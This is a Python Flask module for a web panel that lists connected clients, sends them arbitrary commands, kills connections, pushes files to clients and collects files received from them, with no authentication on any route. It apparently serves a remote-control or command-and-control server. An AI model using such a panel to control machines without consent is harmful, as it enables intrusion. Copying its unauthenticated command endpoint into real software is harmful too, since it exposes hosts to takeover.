import json
import mimetypes
import os
import queue
import uuid
from datetime import datetime
from pathlib import Path

from flask import Flask, Response, jsonify, request, send_from_directory, stream_with_context
from werkzeug.utils import secure_filename



def create_app(server_instance):
    app = Flask(__name__, static_folder='../../static', static_url_path='')

    @app.get('/')
    def index():
        return send_from_directory(app.static_folder, 'index.html')

    @app.get('/api/connections')
    def get_connections():
        return jsonify({
            'code': 0,
            'data': server_instance.get_connections_payload()
        })

    @app.post('/api/connections/<client_id>/command')
    def send_command(client_id):
        payload = request.get_json(silent=True) or {}
        command = (payload.get('command') or '').strip()

        if not command:
            return jsonify({
                'code': 1,
                'message': 'command is required'
            }), 400

        try:
            result = server_instance.submit_web_command(client_id, command)
            return jsonify({
                'code': 0,
                'message': 'ok',
                'data': result
            })
        except Exception as e:
            return jsonify({
                'code': 1,
                'message': str(e)
            }), 400

    @app.post('/api/connections/<client_id>/kill')
    def kill_connection(client_id):
        try:
            server_instance.kill_connection_by_client_id(client_id)
            return jsonify({
                'code': 0,
                'message': 'ok'
            })
        except Exception as e:
            return jsonify({
                'code': 1,
                'message': str(e)
            }), 400

    @app.get('/api/stream')
    def stream():
        q = server_instance.event_bus.subscribe()

        def event_stream():
            try:
                while True:
                    try:
                        item = q.get(timeout=15)
                        yield f"event: {item['event']}\n"
                        yield f"data: {json.dumps(item['data'], ensure_ascii=False)}\n\n"
                    except queue.Empty:
                        yield "event: ping\n"
                        yield f"data: {json.dumps({'time': datetime.now().isoformat()}, ensure_ascii=False)}\n\n"
            finally:
                server_instance.event_bus.unsubscribe(q)

        return Response(
            stream_with_context(event_stream()),
            mimetype='text/event-stream',
            headers={
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'X-Accel-Buffering': 'no'
            }
        )

    #web files
    @app.post('/api/connections/<client_id>/upload')
    def upload_file_to_client(client_id):
        upload = request.files.get('file')
        if not upload or not upload.filename:
            return jsonify({
                'code': 1,
                'message': 'file is required'
            }), 400

        try:
            safe_name = secure_filename(upload.filename) or 'upload.bin'
            temp_dir = os.path.join(server_instance.upload_tmp_dir, uuid.uuid4().hex)
            os.makedirs(temp_dir, exist_ok=True)

            temp_path = os.path.join(temp_dir, safe_name)
            upload.save(temp_path)

            result = server_instance.submit_web_upload(client_id, temp_path, safe_name)
            return jsonify({
                'code': 0,
                'message': 'ok',
                'data': result
            })
        except Exception as e:
            return jsonify({
                'code': 1,
                'message': str(e)
            }), 400


    def _list_received_files():
        items = []
        directory = server_instance.received_files_dir

        if not os.path.isdir(directory):
            return items

        for name in os.listdir(directory):
            path = os.path.join(directory, name)

            if not os.path.isfile(path):
                continue

            if name.endswith('.meta.json'):
                continue

            stat = os.stat(path)
            meta_path = path + '.meta.json'
            meta = {}

            if os.path.isfile(meta_path):
                try:
                    with open(meta_path, 'r', encoding='utf-8') as f:
                        meta = json.load(f) or {}
                except Exception:
                    meta = {}

            items.append({
                'client_id': meta.get('client_id', ''),
                'hostname': meta.get('hostname', ''),
                'addr': meta.get('addr', ''),
                'original_name': meta.get('original_name', name),
                'saved_name': name,
                'size': meta.get('size', stat.st_size),
                'created_at': meta.get('created_at') or datetime.fromtimestamp(stat.st_mtime).isoformat(),
                'download_url': f"/api/files/recent/{name}"
            })

        items.sort(key=lambda x: x['created_at'], reverse=True)
        return items

    @app.get('/api/files/recent')
    def get_recent_files():
        return jsonify({
            'code': 0,
            'data': _list_received_files()
        })

    @app.get('/api/files/recent/<path:saved_name>')
    def download_recent_file(saved_name):
        file_path = os.path.join(server_instance.received_files_dir, saved_name)

        if not os.path.isfile(file_path):
            return jsonify({
                'code': 1,
                'message': 'file not found'
            }), 404

        return send_from_directory(
            server_instance.received_files_dir,
            saved_name,
            as_attachment=True,
            download_name=saved_name
        )


    def _safe_received_file_path(saved_name: str) -> str:
        base_dir = os.path.abspath(server_instance.received_files_dir)
        file_path = os.path.abspath(os.path.join(base_dir, saved_name))
        if not file_path.startswith(base_dir + os.sep) and file_path != base_dir:
            raise ValueError('invalid file path')
        return file_path

    def _guess_preview_type(filename: str) -> str:
        ext = os.path.splitext(filename)[1].lower()

        image_exts = {'.png', '.jpg', '.jpeg', '.gif', '.webp', '.bmp'}
        text_exts = {
            '.txt', '.log', '.py', '.js', '.ts', '.json', '.xml', '.yaml', '.yml',
            '.ini', '.cfg', '.conf', '.md', '.csv', '.sql', '.bat', '.sh'
        }

        if ext in image_exts:
            return 'image'
        if ext in text_exts:
            return 'text'

        mime_type, _ = mimetypes.guess_type(filename)
        if mime_type:
            if mime_type.startswith('image/'):
                return 'image'
            if mime_type.startswith('text/'):
                return 'text'

        return 'unsupported'

    @app.get('/api/files/recent/<path:saved_name>/raw')
    def get_recent_file_raw(saved_name):
        try:
            file_path = _safe_received_file_path(saved_name)
        except ValueError:
            return jsonify({
                'code': 1,
                'message': 'invalid file path'
            }), 400

        if not os.path.isfile(file_path):
            return jsonify({
                'code': 1,
                'message': 'file not found'
            }), 404

        directory = os.path.dirname(file_path)
        filename = os.path.basename(file_path)
        return send_from_directory(directory, filename, as_attachment=False)

    @app.get('/api/files/recent/<path:saved_name>/preview')
    def preview_recent_file(saved_name):
        try:
            file_path = _safe_received_file_path(saved_name)
        except ValueError:
            return jsonify({
                'code': 1,
                'message': 'invalid file path'
            }), 400

        if not os.path.isfile(file_path):
            return jsonify({
                'code': 1,
                'message': 'file not found'
            }), 404

        preview_type = _guess_preview_type(saved_name)

        if preview_type == 'image':
            return jsonify({
                'code': 0,
                'data': {
                    'type': 'image',
                    'name': os.path.basename(file_path),
                    'url': f'/api/files/recent/{saved_name}/raw'
                }
            })

        if preview_type == 'text':
            max_bytes = 200 * 1024
            truncated = False

            with open(file_path, 'rb') as f:
                raw = f.read(max_bytes + 1)

            if len(raw) > max_bytes:
                raw = raw[:max_bytes]
                truncated = True

            text = raw.decode('utf-8', errors='replace')
            if truncated:
                text += '\n\n...(已截断)'

            return jsonify({
                'code': 0,
                'data': {
                    'type': 'text',
                    'name': os.path.basename(file_path),
                    'content': text,
                    'truncated': truncated
                }
            })

        return jsonify({
            'code': 0,
            'data': {
                'type': 'unsupported',
                'name': os.path.basename(file_path)
            }
        })

    @app.delete('/api/files/recent/<path:saved_name>')
    def delete_recent_file(saved_name):
        try:
            file_path = _safe_received_file_path(saved_name)
        except ValueError:
            return jsonify({
                'code': 1,
                'message': 'invalid file path'
            }), 400

        if not os.path.isfile(file_path):
            return jsonify({
                'code': 1,
                'message': 'file not found'
            }), 404

        meta_path = file_path + '.meta.json'

        try:
            os.remove(file_path)
            if os.path.isfile(meta_path):
                os.remove(meta_path)
        except Exception as e:
            return jsonify({
                'code': 1,
                'message': str(e)
            }), 500

        return jsonify({
            'code': 0,
            'message': 'ok'
        })


    # 可选：限制最大上传体积，单位字节
    app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024  # 50 MB
    BASE_DIR = Path(__file__).resolve().parent

    def build_stored_filename(original_name: str) -> str:
        safe_name = secure_filename(original_name)
        if not safe_name:
            safe_name = "unnamed_file"

        ext = Path(safe_name).suffix
        stem = Path(safe_name).stem
        unique_suffix = uuid.uuid4().hex[:8]
        return f"{stem}_{unique_suffix}{ext}"

    @app.route("/api/files/upload", methods=["POST"])
    def upload_file():
        if "file" not in request.files:
            return jsonify({
                "ok": False,
                "error": "Missing file field: file"
            }), 400

        file = request.files["file"]
        if not file or file.filename == "":
            return jsonify({
                "ok": False,
                "error": "No file selected"
            }), 400

        category = request.form.get("category", "").strip()
        client_id = request.form.get("client_id", "").strip()

        target_dir = Path(server_instance.http_uploads_dir)
        if category:
            target_dir = target_dir / secure_filename(category)
        if client_id:
            target_dir = target_dir / secure_filename(client_id)

        target_dir.mkdir(parents=True, exist_ok=True)

        stored_name = build_stored_filename(file.filename)
        stored_path = target_dir / stored_name
        file.save(stored_path)

        file_size = stored_path.stat().st_size

        return jsonify({
            "ok": True,
            "original_name": file.filename,
            "stored_name": stored_name,
            # "stored_path": str(stored_path.relative_to(BASE_DIR)).replace("\\", "/"),
            "size": file_size,
            "category": category,
            "client_id": client_id,
        })

    @app.errorhandler(413)
    def file_too_large(_):
        return jsonify({
            "ok": False,
            "error": "File is too large"
        }), 413





    return app

